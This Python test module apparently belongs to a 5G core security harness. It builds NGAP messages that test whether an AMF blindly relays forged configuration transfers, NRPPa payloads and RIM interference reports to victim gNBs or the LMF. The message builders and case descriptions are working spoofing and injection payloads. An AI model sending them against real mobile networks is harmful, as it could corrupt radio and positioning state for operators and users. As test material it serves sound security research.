"""Test cases for g09/g10/g11 — the non-UE-associated RAN-to-* relay surface.

All three procedures are non-UE-associated NGAP Class 2 messages that make the AMF
act as a *confused-deputy relay*: none of them carry AMF-UE-NGAP-ID / RAN-UE-NGAP-ID,
so the UE-context lookup flaw is irrelevant. The security question is whether the AMF
binds the *claimed source* to the sending SCTP association / NG Setup identity before
forwarding attacker-chosen payloads to a different legitimate gNB (g09/g11) or the LMF
(g10).

  g09 UplinkRANConfigurationTransfer      (procCode 48) -> DL RAN Config Transfer to target gNB
  g10 UplinkNonUEAssociatedNRPPaTransport (procCode 47) -> non-UE NRPPa relay to LMF
  g11 UplinkRIMInformationTransfer         (procCode 53) -> DL RIM Info Transfer to target gNB

g09 reuses the existing B.uplink_ran_configuration_transfer builder; g10 and g11 get
NEW local builders here (this file owns them — builders.py is left untouched).
"""
from __future__ import annotations

from . import builders as B, ngap

CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
       "gnb_id": 4660, "gnb_id_len": 32, "nci": 17}


# ---------------------------------------------------------------- NEW builders
# g10: UplinkNonUEAssociatedNRPPaTransport. RoutingID (id 89) + NRPPa-PDU (id 46),
# both OCTET STRING, CRITICALITY reject, message criticality ignore. The blind relay
# hands the opaque NRPPa payload to the LMF selected purely by the attacker-chosen
# Routing ID — no binding to the sending gNB.
def uplink_non_ue_associated_nrppa_transport(cfg: dict, *,
                                             routing_id: bytes = b"\x00\x00",
                                             nrppa_pdu: bytes = b"\x00"):
    ies = [
        {"id": 89, "criticality": "reject", "value": ("RoutingID", routing_id)},
        {"id": 46, "criticality": "reject", "value": ("NRPPa-PDU", nrppa_pdu)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 47, "criticality": "ignore",
        "value": ("UplinkNonUEAssociatedNRPPaTransport", {"protocolIEs": ies}),
    })


# g11: UplinkRIMInformationTransfer. Sole IE RIMInformationTransfer (id 175, ignore).
# The container names BOTH the target RAN node (routing) and the *claimed* source RAN
# node (RIM-layer origin) plus the RIM payload. Attacker sets source to itself or spoofs
# a legitimate neighbour; the AMF relays via DL RIM Information Transfer to the target.
def _tai(cfg: dict, tac=None):
    plmn = B.encode_plmn(cfg["mcc"], cfg["mnc"])
    tac_b = int(cfg["tac"] if tac is None else tac).to_bytes(3, "big")
    return {"pLMNIdentity": plmn, "tAC": tac_b}


def uplink_rim_information_transfer(cfg: dict, *, target_gnb_id: int,
                                    source_gnb_id: int | None = None, tac=None,
                                    gnb_set_id: int = 0,
                                    rs_detection: str = "rs-detected"):
    if source_gnb_id is None:
        source_gnb_id = int(cfg.get("gnb_id", 4660))
    rim = {
        "targetRANNodeID-RIM": {
            "globalRANNodeID": B._global_gnb_id(cfg, target_gnb_id),
            "selectedTAI": _tai(cfg, tac),
        },
        "sourceRANNodeID": {
            "globalRANNodeID": B._global_gnb_id(cfg, source_gnb_id),
            "selectedTAI": _tai(cfg, tac),
        },
        "rIMInformation": {
            "targetgNBSetID": (int(gnb_set_id), 22),
            "rIM-RSDetection": rs_detection,
        },
    }
    ies = [
        {"id": 175, "criticality": "ignore",
         "value": ("RIMInformationTransfer", rim)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 53, "criticality": "ignore",
        "value": ("UplinkRIMInformationTransfer", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- cases
CASES = [
    # ---- g09 UplinkRANConfigurationTransfer (existing builder) -------------
    {"id": "g09-a", "msg": "UplinkRANConfigurationTransfer",
     "desc": "Baseline cross-gNB SON/Xn config injection: AMF blind-relays a "
             "SONConfigurationTransfer to victim target gNB (source = self).",
     "build": lambda cfg: B.uplink_ran_configuration_transfer(
         cfg, target_gnb_id=0x9999, source_gnb_id=cfg["gnb_id"])},
    {"id": "g10-a", "msg": "UplinkNonUEAssociatedNRPPaTransport",
     "desc": "Forged non-UE NRPPa injection to the LMF: AMF blind-relays an attacker "
             "NRPPa-PDU (confused deputy), poisoning positioning/LMF state.",
     "build": lambda cfg: uplink_non_ue_associated_nrppa_transport(
         cfg, routing_id=b"\x00\x01", nrppa_pdu=b"\x00")},
    {"id": "g11-a", "msg": "UplinkRIMInformationTransfer",
     "desc": "Forged RIM interference report to a victim gNB: AMF relays a fabricated "
             "RIMInformation (rs-detected) to the target.",
     "build": lambda cfg: uplink_rim_information_transfer(
         cfg, target_gnb_id=0x9999, source_gnb_id=cfg["gnb_id"])},
]
